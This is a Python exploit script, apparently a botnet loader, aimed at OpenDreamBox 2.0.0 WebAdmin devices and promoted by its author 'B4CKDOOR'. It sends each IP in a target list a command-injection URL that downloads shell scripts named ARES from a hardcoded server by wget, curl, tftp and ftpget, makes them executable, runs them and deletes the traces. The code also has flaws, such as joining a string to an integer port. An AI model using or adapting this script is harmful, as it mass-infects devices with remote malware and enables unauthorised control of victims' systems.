#!/usr/bin/env python
# -*- coding: utf-8 -*- 
#MY ARCHIVE: b4ckdoorarchive.host and join my discord by website link invite!#
# OpenDreamBox 2.0.0 - Plugin WebAdmin Exploit made by B4CKDOOR - FULL PRIVATE#
#DIDN'T BLOCKED ALL PAYLOAD WITH + IP + , SO YOU CAN CHANGE PAYLOAD EASILLY IF WANTED.#

import threading, random, socket, time, sys, requests, re, os

if len(sys.argv) < 3:
	print "\033[37mUsage: python "+sys.argv[0]+" <list> <port>\033[37m"
	sys.exit()

#USAGE: python b4ck_dreambox.py vuln.txt 10000
ip = "122.22.22.2" # BINS LOCATION IP
vulns = open(sys.argv[1], "r").readlines()
port = int(sys.argv[2]) # PORTS 10000 8081 8880 8889
class send_payload(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			url = "http://" + self.ip + ":"+port+"/webadmin/script?command=| wget http://" + ip + "/ARES.sh; curl -O http://" + ip + "/ARES.sh; chmod 777 ARES.sh; sh ARES.sh; tftp 122.22.22.2 -c get ARES.sh; chmod 777 ARES.sh; sh ARES.sh; tftp -r ARES2.sh -g 122.22.22.2; chmod 777 ARES2.sh; sh ARES2.sh; ftpget -v -u anonymous -p anonymous -P 21 122.22.22.2 ARES1.sh ARES1.sh; sh ARES1.sh; rm -rf ARES.*"
			requests.get(url, timeout=8)
			print "[OpenDreamBox] Loading: %s"%(self.ip)
		except:
			pass

for IP in vulns:
	try:
		ip = "".join(IP)
		ip = ip.replace("\n", "")
		t = send_payload(ip)
		t.start()
		time.sleep(0.03)
	except:
		pass #CODED BY B4CKDOOR